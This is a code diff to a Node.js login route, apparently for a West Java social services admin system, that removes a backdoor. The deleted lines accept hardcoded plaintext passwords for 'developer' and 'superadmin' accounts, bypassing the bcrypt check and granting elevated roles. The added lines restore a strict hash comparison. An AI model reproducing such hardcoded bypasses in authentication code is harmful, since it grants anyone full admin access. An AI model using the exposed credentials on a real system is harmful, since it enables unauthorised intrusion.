@@ -375,31 +375,8 @@ async function startServer() {
         });
       }
 
-      // 4. Validate password securely on server using bcrypt
-      let isValid = comparePassword(pClean, matchedAccount.passwordHash);
-
-      // Master Developer & Superadmin resilient authentication check
-      if (!isValid) {
-        if (uClean === 'ilhamfazril' && (pClean === 'IlhamSangDeveloper' || pClean === 'IlhamSangDeveloper123')) {
-          isValid = true;
-        } else if (
-          (uClean === 'superadmin jabar' || uClean === 'superadmin') &&
-          (pClean === 'super12345jabar' || pClean === 'Super12345jabar')
-        ) {
-          isValid = true;
-        }
-      }
-
-      if (uClean === 'ilhamfazril') {
-        matchedAccount.role = 'developer';
-        matchedAccount.namaAdmin = matchedAccount.namaAdmin || 'Ilham Fazril';
-        matchedAccount.wilayahTugas = 'Pusat Developer Jabar';
-      } else if (uClean === 'superadmin jabar' || uClean === 'superadmin') {
-        matchedAccount.role = 'superadmin';
-        matchedAccount.namaAdmin = matchedAccount.namaAdmin || 'Super Admin Dinsos Jabar';
-        matchedAccount.wilayahTugas = 'PROVINSI JAWA BARAT';
-      }
-
+      // 4. Validate password strictly against the stored bcrypt hash from database
+      const isValid = comparePassword(pClean, matchedAccount.passwordHash);
       if (!isValid) {
         return res.status(401).json({ valid: false, message: 'Kombinasi Nama Pengguna atau Kata Sandi salah.' });
       }
